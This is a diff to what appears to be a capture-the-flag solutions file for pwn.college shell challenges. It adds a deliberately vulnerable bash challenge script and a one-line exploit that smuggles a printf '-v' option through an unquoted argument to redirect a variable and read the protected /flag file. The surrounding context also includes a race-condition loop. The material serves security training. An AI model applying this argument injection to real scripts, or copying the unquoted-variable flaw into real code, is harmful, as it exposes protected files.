@@ -361,3 +361,23 @@ int main(int argc, char** argv) {
 ```sh
 while true; do ./program 2>/dev/null; done | grep pwn & ./program
 ```
+
+# Journey of the PATH
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+[ -n "$1" ] || exit
+
+GUESSFILE=$(mktemp)
+
+printf $1 > $GUESSFILE
+grep -f /flag < $GUESSFILE || echo Goodbye!
+```
+
+### exploit
+```sh
+/challenge/run "-v GUESSFILE /flag"
+```
